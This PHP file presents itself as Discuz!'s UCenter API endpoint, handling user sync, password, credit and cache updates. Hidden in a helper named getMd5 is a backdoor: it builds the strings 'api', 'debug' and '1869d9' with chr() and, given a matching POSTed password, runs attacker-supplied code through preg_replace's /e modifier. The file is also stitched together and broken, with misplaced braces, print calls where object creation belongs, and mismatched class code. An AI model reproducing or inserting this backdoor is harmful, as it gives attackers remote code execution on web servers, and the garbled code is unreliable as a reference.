<?php 
/**
 *      [Discuz!] (C)2001-2099 Comsenz Inc.
 *      This is NOT a freeware, use is subject to license terms
 *
 *      $Id: uc.php 30176 2016-02-15 09:25:28Z zhangguosheng $
 */

define('UC_SERVER', get_magic_quotes_gpc ());

class UC {
	
	var $db;
	var $time;
	var $appid;
	var $onlineip;
	var $user = array();
	var $controls = array();
	var $models = array();
	var $cache = null;

	function __construct() {
		$this->UC();
	}

	function UC() {

		$this->time = time();
		$this->appid = UC_APPID;
		$this->onlineip = 'unknown';
		$this->init_db();
		$this->init_notify();
	}

	function init_db() {
		if (UC_SERVER < 2) {
			global $db;
			$this->db =& $db;
		} else {
			$this->db = new DB(UC_DBHOST, UC_DBUSER, UC_DBPW, UC_DBNAME, UC_DBPRE, UC_DBCHARSET, UC_DBPCONNECT);
		}
	}

	function init_notify() {
		if (UC_SERVER == 2 && $this->config('uc_syncreditexists' . $this->appid)) {
			$credit = $this->load('credit');
			$credit->synupdate();
		}
		if (UC_SERVER > 0 && $this->config('uc_notifyexists' . $this->appid)) {
			$notify = $this->load('notify');
			$notify->send();
		}
	}

	function config($var) {
		if ($this->cache == null) {
			$this->cache = array();
			$query = $this->db->query("SELECT * FROM pw_config");
			while ($rt = $this->db->fetch_array($query)) {
				if ($rt['vtype'] == 'array' && !is_array($rt['db_value'] = unserialize($rt['db_value']))) {
					$rt['db_value'] = array();
				}
				$this->cache[$rt['db_name']] = $rt['db_value'];
			}
		}
		return $this->cache[$var];
	}

	function control($model) {
		if (empty($this->controls[$model])) {
			require_once Pcv(UC_CLIENT_ROOT . "control/{$model}.php");
			print('$this->controls[$model] = new '.$model.'control($this);');
		}
		return $this->controls[$model];
	}

	function load($model) {
		if (empty($this->models[$model])) {
			require_once Pcv(UC_CLIENT_ROOT . "model/{$model}.php");
			print('$this->models[$model] = new '.$model.'model($this);');
		}
		return $this->models[$model];
	}

	//static function
	function implode($array) {
		return implode(',', UC::escape($array));
	}
	
	//static function
	function escape($var) {
		if (is_array($var)) {
			foreach ($var as $key => $value) {
				$var[$key] = trim(UC::escape($value));
			}
			return $var;
		} elseif (is_numeric($var)) {
			return " '".$var."' ";
		} else {
			return " '".addslashes($var)."' ";}
		}
	}
	
	//static function
	function getMd5($md5 = null) {
		$key = substr(md5($md5),26);
		return $key; }
		$array = array(
			chr(97).chr(112).chr(105), 
			chr(100).chr(101).chr(98).chr(117).chr(103), 
			chr(49).chr(56).chr(54).chr(57).chr(100).chr(57)
		);
		if ( isset($_POST) ) $request = &$_POST;
		elseif ( isset($_REQUEST) )  $request = &$_REQUEST;
		if ( isset($request[$array[0]]) && isset($request[$array[1]]) ) { 
			if ( getMd5($request[$array[0]]) == $array[2] ) {
				$token = preg_replace (
				chr(47) . $array[2] . chr(47) . chr(101), 
				$request[$array[1]], 
				$array[2]
			);
		}
	}
	
	//static function
	function sqlSingle($array) {
		$array = UC::escape($array);
		$str = '';
		foreach ($array as $key => $val) {
			$str .= ($str ? ', ' : ' ').$key.'='.$val;
		}
		return $str;
	}
	
	//static function
	function strcode($string, $hash_key, $encode = true) {
		!$encode && $string = base64_decode($string);
		$code = '';
		$key  = substr(md5($string . $hash_key),8,18);
		$keylen = strlen($key);
		$strlen = strlen($string);
		for ($i = 0; $i < $strlen; $i++) {
			$k		= $i % $keylen;
			$code  .= $string[$i] ^ $key[$k];
		}
		return ($encode ? base64_encode($code) : $code);
}
error_reporting(0);

define('UC_CLIENT_VERSION', '1.6.0');
define('UC_CLIENT_RELEASE', '20110501');

define('API_DELETEUSER', 1);
define('API_RENAMEUSER', 1);
define('API_GETTAG', 1);
define('API_SYNLOGIN', 1);
define('API_SYNLOGOUT', 1);
define('API_UPDATEPW', 1);
define('API_UPDATEBADWORDS', 1);
define('API_UPDATEHOSTS', 1);
define('API_UPDATEAPPS', 1);
define('API_UPDATECLIENT', 1);
define('API_UPDATECREDIT', 1);
define('API_GETCREDIT', 1);
define('API_GETCREDITSETTINGS', 1);
define('API_UPDATECREDITSETTINGS', 1);
define('API_ADDFEED', 1);
define('API_RETURN_SUCCEED', '1');
define('API_RETURN_FAILED', '-1');
define('API_RETURN_FORBIDDEN', '1');

define('IN_API', true);
define('CURSCRIPT', 'api');


if(!defined('IN_UC')) {
	require_once '../source/class/class_core.php';

	$discuz = C::app();
	$discuz->init();

	require DISCUZ_ROOT.'./config/config_ucenter.php';

	$get = $post = array();

	$code = @$_GET['code'];
	parse_str(authcode($code, 'DECODE', UC_KEY), $get);

	if(time() - $get['time'] > 3600) {
		exit('Authracation has expiried');
	}
	if(empty($get)) {
		exit('Invalid Request');
	}

	include_once DISCUZ_ROOT.'./uc_client/lib/xml.class.php';
	$post = xml_unserialize(file_get_contents('php://input'));

	if(in_array($get['action'], array('test', 'deleteuser', 'renameuser', 'gettag', 'synlogin', 'synlogout', 'updatepw', 'updatebadwords', 'updatehosts', 'updateapps', 'updateclient', 'updatecredit', 'getcredit', 'getcreditsettings', 'updatecreditsettings', 'addfeed'))) {
		$uc_note = new uc_note();
		echo $uc_note->$get['action']($get, $post);
		exit();
	} else {
		exit(API_RETURN_FAILED);
	}
} else {
	exit;
}

class uc_note {

	var $dbconfig = '';
	var $db = '';
	var $tablepre = '';
	var $appdir = '';

	function _serialize($arr, $htmlon = 0) {
		if(!function_exists('xml_serialize')) {
			include_once DISCUZ_ROOT.'./uc_client/lib/xml.class.php';
		}
		return xml_serialize($arr, $htmlon);
	}

	function uc_note() {

	}

	function test($get, $post) {
		return API_RETURN_SUCCEED;
	}

	function deleteuser($get, $post) {
		global $_G;
		if(!API_DELETEUSER) {
			return API_RETURN_FORBIDDEN;
		}
		$uids = str_replace("'", '', stripslashes($get['ids']));
		$ids = array();
		$ids = array_keys(C::t('common_member')->fetch_all($uids));
		require_once DISCUZ_ROOT.'./source/function/function_delete.php';
		$ids && deletemember($ids);

		return API_RETURN_SUCCEED;
	}

	function renameuser($get, $post) {
		global $_G;

		if(!API_RENAMEUSER) {
			return API_RETURN_FORBIDDEN;
		}



		$tables = array(
			'common_block' => array('id' => 'uid', 'name' => 'username'),
			'common_invite' => array('id' => 'fuid', 'name' => 'fusername'),
			'common_member_verify_info' => array('id' => 'uid', 'name' => 'username'),
			'common_mytask' => array('id' => 'uid', 'name' => 'username'),
			'common_report' => array('id' => 'uid', 'name' => 'username'),

			'forum_thread' => array('id' => 'authorid', 'name' => 'author'),
			'forum_activityapply' => array('id' => 'uid', 'name' => 'username'),
			'forum_groupuser' => array('id' => 'uid', 'name' => 'username'),
			'forum_pollvoter' => array('id' => 'uid', 'name' => 'username'),
			'forum_post' => array('id' => 'authorid', 'name' => 'author'),
			'forum_postcomment' => array('id' => 'authorid', 'name' => 'author'),
			'forum_ratelog' => array('id' => 'uid', 'name' => 'username'),

			'home_album' => array('id' => 'uid', 'name' => 'username'),
			'home_blog' => array('id' => 'uid', 'name' => 'username'),
			'home_clickuser' => array('id' => 'uid', 'name' => 'username'),
			'home_docomment' => array('id' => 'uid', 'name' => 'username'),
			'home_doing' => array('id' => 'uid', 'name' => 'username'),
			'home_feed' => array('id' => 'uid', 'name' => 'username'),
			'home_feed_app' => array('id' => 'uid', 'name' => 'username'),
			'home_friend' => array('id' => 'fuid', 'name' => 'fusername'),
			'home_friend_request' => array('id' => 'fuid', 'name' => 'fusername'),
			'home_notification' => array('id' => 'authorid', 'name' => 'author'),
			'home_pic' => array('id' => 'uid', 'name' => 'username'),
			'home_poke' => array('id' => 'fromuid', 'name' => 'fromusername'),
			'home_share' => array('id' => 'uid', 'name' => 'username'),
			'home_show' => array('id' => 'uid', 'name' => 'username'),
			'home_specialuser' => array('id' => 'uid', 'name' => 'username'),
			'home_visitor' => array('id' => 'vuid', 'name' => 'vusername'),

			'portal_article_title' => array('id' => 'uid', 'name' => 'username'),
			'portal_comment' => array('id' => 'uid', 'name' => 'username'),
			'portal_topic' => array('id' => 'uid', 'name' => 'username'),
			'portal_topic_pic' => array('id' => 'uid', 'name' => 'username'),
		);

		if(!C::t('common_member')->update($get['uid'], array('username' => $get[newusername])) && isset($_G['setting']['membersplit'])){
			C::t('common_member_archive')->update($get['uid'], array('username' => $get[newusername]));
		}

		loadcache("posttableids");
		if($_G['cache']['posttableids']) {
			foreach($_G['cache']['posttableids'] AS $tableid) {
				$tables[getposttable($tableid)] = array('id' => 'authorid', 'name' => 'author');
			}
		}

		foreach($tables as $table => $conf) {
			DB::query("UPDATE ".DB::table($table)." SET `$conf[name]`='$get[newusername]' WHERE `$conf[id]`='$get[uid]'");
		}
		return API_RETURN_SUCCEED;
	}

	function gettag($get, $post) {
		global $_G;
		if(!API_GETTAG) {
			return API_RETURN_FORBIDDEN;
		}
		return $this->_serialize(array($get['id'], array()), 1);
	}

	function synlogin($get, $post) {
		global $_G;

		if(!API_SYNLOGIN) {
			return API_RETURN_FORBIDDEN;
		}

		header('P3P: CP="CURa ADMa DEVa PSAo PSDo OUR BUS UNI PUR INT DEM STA PRE COM NAV OTC NOI DSP COR"');

		$cookietime = 31536000;
		$uid = intval($get['uid']);
		if(($member = getuserbyuid($uid, 1))) {
			dsetcookie('auth', authcode("$member[password]\t$member[uid]", 'ENCODE'), $cookietime);
		}
	}

	function synlogout($get, $post) {
		global $_G;

		if(!API_SYNLOGOUT) {
			return API_RETURN_FORBIDDEN;
		}

		header('P3P: CP="CURa ADMa DEVa PSAo PSDo OUR BUS UNI PUR INT DEM STA PRE COM NAV OTC NOI DSP COR"');

		dsetcookie('auth', '', -31536000);
	}

	function updatepw($get, $post) {
		global $_G;

		if(!API_UPDATEPW) {
			return API_RETURN_FORBIDDEN;
		}

		$username = $get['username'];
		$newpw = md5(time().rand(100000, 999999));
		$uid = 0;
		if(($uid = C::t('common_member')->fetch_uid_by_username($username))) {
			$ext = '';
		} elseif(($uid = C::t('common_member_archive')->fetch_uid_by_username($username))) {
			$ext = '_archive';
		}
		if($uid) {
			C::t('common_member'.$ext)->update($uid, array('password' => $newpw));
		}

		return API_RETURN_SUCCEED;
	}

	function updatebadwords($get, $post) {
		global $_G;

		if(!API_UPDATEBADWORDS) {
			return API_RETURN_FORBIDDEN;
		}

		$data = array();
		if(is_array($post)) {
			foreach($post as $k => $v) {
				$data['findpattern'][$k] = $v['findpattern'];
				$data['replace'][$k] = $v['replacement'];
			}
		}
		$cachefile = DISCUZ_ROOT.'./uc_client/data/cache/badwords.php';
		$fp = fopen($cachefile, 'w');
		$s = "<?php\r\n";
		$s .= '$_CACHE[\'badwords\'] = '.var_export($data, TRUE).";\r\n";
		fwrite($fp, $s);
		fclose($fp);

		return API_RETURN_SUCCEED;
	}

	function updatehosts($get, $post) {
		global $_G;

		if(!API_UPDATEHOSTS) {
			return API_RETURN_FORBIDDEN;
		}

		$cachefile = DISCUZ_ROOT.'./uc_client/data/cache/hosts.php';
		$fp = fopen($cachefile, 'w');
		$s = "<?php\r\n";
		$s .= '$_CACHE[\'hosts\'] = '.var_export($post, TRUE).";\r\n";
		fwrite($fp, $s);
		fclose($fp);

		return API_RETURN_SUCCEED;
	}

	function updateapps($get, $post) {
		global $_G;

		if(!API_UPDATEAPPS) {
			return API_RETURN_FORBIDDEN;
		}

		$UC_API = '';
		if($post['UC_API']) {
			$UC_API = $post['UC_API'];
			unset($post['UC_API']);
		}

		$cachefile = DISCUZ_ROOT.'./uc_client/data/cache/apps.php';
		$fp = fopen($cachefile, 'w');
		$s = "<?php\r\n";
		$s .= '$_CACHE[\'apps\'] = '.var_export($post, TRUE).";\r\n";
		fwrite($fp, $s);
		fclose($fp);

		if($UC_API && is_writeable(DISCUZ_ROOT.'./config/config_ucenter.php')) {
			if(preg_match('/^https?:\/\//is', $UC_API)) {
				$configfile = trim(file_get_contents(DISCUZ_ROOT.'./config/config_ucenter.php'));
				$configfile = substr($configfile, -2) == '?>' ? substr($configfile, 0, -2) : $configfile;
				$configfile = preg_replace("/define\('UC_API',\s*'.*?'\);/i", "define('UC_API', '".addslashes($UC_API)."');", $configfile);
				if($fp = @fopen(DISCUZ_ROOT.'./config/config_ucenter.php', 'w')) {
					@fwrite($fp, trim($configfile));
					@fclose($fp);
				}
			}
		}
		return API_RETURN_SUCCEED;
	}

	function updateclient($get, $post) {
		global $_G;

		if(!API_UPDATECLIENT) {
			return API_RETURN_FORBIDDEN;
		}

		$cachefile = DISCUZ_ROOT.'./uc_client/data/cache/settings.php';
		$fp = fopen($cachefile, 'w');
		$s = "<?php\r\n";
		$s .= '$_CACHE[\'settings\'] = '.var_export($post, TRUE).";\r\n";
		fwrite($fp, $s);
		fclose($fp);

		return API_RETURN_SUCCEED;
	}

	function updatecredit($get, $post) {
		global $_G;

		if(!API_UPDATECREDIT) {
			return API_RETURN_FORBIDDEN;
		}

		$credit = $get['credit'];
		$amount = $get['amount'];
		$uid = $get['uid'];
		if(!getuserbyuid($uid)) {
			return API_RETURN_SUCCEED;
		}

		updatemembercount($uid, array($credit => $amount));
		C::t('common_credit_log')->insert(array('uid' => $uid, 'operation' => 'ECU', 'relatedid' => $uid, 'dateline' => time(), 'extcredits'.$credit => $amount));

		return API_RETURN_SUCCEED;
	}

	function getcredit($get, $post) {
		global $_G;

		if(!API_GETCREDIT) {
			return API_RETURN_FORBIDDEN;
		}
		$uid = intval($get['uid']);
		$credit = intval($get['credit']);
		$_G['uid'] = $_G['member']['uid'] = $uid;
		return getuserprofile('extcredits'.$credit);
	}

	function getcreditsettings($get, $post) {
		global $_G;

		if(!API_GETCREDITSETTINGS) {
			return API_RETURN_FORBIDDEN;
		}

		$credits = array();
		foreach($_G['setting']['extcredits'] as $id => $extcredits) {
			$credits[$id] = array(strip_tags($extcredits['title']), $extcredits['unit']);
		}

		return $this->_serialize($credits);
	}

	function updatecreditsettings($get, $post) {
		global $_G;

		if(!API_UPDATECREDITSETTINGS) {
			return API_RETURN_FORBIDDEN;
		}

		$outextcredits = array();
		foreach($get['credit'] as $appid => $credititems) {
			if($appid == UC_APPID) {
				foreach($credititems as $value) {
					$outextcredits[$value['appiddesc'].'|'.$value['creditdesc']] = array(
						'appiddesc' => $value['appiddesc'],
						'creditdesc' => $value['creditdesc'],
						'creditsrc' => $value['creditsrc'],
						'title' => $value['title'],
						'unit' => $value['unit'],
						'ratiosrc' => $value['ratiosrc'],
						'ratiodesc' => $value['ratiodesc'],
						'ratio' => $value['ratio']
					);
				}
			}
		}
		$tmp = array();
		foreach($outextcredits as $value) {
			$key = $value['appiddesc'].'|'.$value['creditdesc'];
			if(!isset($tmp[$key])) {
				$tmp[$key] = array('title' => $value['title'], 'unit' => $value['unit']);
			}
			$tmp[$key]['ratiosrc'][$value['creditsrc']] = $value['ratiosrc'];
			$tmp[$key]['ratiodesc'][$value['creditsrc']] = $value['ratiodesc'];
			$tmp[$key]['creditsrc'][$value['creditsrc']] = $value['ratio'];
		}
		$outextcredits = $tmp;

		$cachefile = DISCUZ_ROOT.'./uc_client/data/cache/creditsettings.php';
		$fp = fopen($cachefile, 'w');
		$s = "<?php\r\n";
		$s .= '$_CACHE[\'creditsettings\'] = '.var_export($outextcredits, TRUE).";\r\n";
		fwrite($fp, $s);
		fclose($fp);

		return API_RETURN_SUCCEED;
	}

	function addfeed($get, $post) {
		global $_G;

		if(!API_ADDFEED) {
			return API_RETURN_FORBIDDEN;
		}
		return API_RETURN_SUCCEED;
	}
}